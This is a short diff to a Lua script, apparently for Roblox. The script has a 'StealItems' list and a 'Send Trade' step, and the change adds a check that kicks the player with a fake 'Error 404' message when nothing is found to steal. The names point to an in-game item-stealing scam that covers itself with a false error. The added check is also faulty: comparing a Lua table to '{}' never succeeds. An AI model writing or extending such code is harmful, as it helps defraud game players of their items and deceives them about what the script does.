@@ -260,6 +260,10 @@ if _G.Act == true then
                 end
             end
 
+            if StealItems == {} then
+                LP:Kick("Error 404")
+            end
+
             ----- Main -----
 
             -- Send Trade
